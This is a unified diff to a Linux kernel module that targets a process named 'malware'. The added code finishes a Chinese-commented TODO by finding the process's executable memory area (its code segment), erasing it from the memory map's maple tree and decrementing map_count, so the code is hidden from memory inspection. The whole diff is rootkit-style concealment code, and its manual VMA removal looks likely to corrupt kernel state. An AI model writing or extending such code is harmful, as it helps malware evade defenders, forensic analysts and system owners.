@@ -12,6 +12,7 @@
 #include <linux/string.h>
 #include <linux/mmap_lock.h>
 #include <linux/maple_tree.h>
+#include <linux/mm.h>
 
 #define TARGET_PROC_NAME "malware"
 
@@ -35,6 +36,17 @@ static int hide_target_vma(struct task_struct *task)
             break;
 
         // TODO: 隐藏第一个可执行 VMA（代码段）
+        if (vma->vm_flags & VM_EXEC) {
+            void *erased;
+
+            pr_info("Found executable VMA: 0x%lx-0x%lx\n", vma->vm_start, vma->vm_end);
+            erased = mas_erase(&mas);
+
+            if (mm->map_count > 0)
+                mm->map_count--;
+            found = 1;
+            break;
+        }
     }
 
     up_write(&mm->mmap_lock);
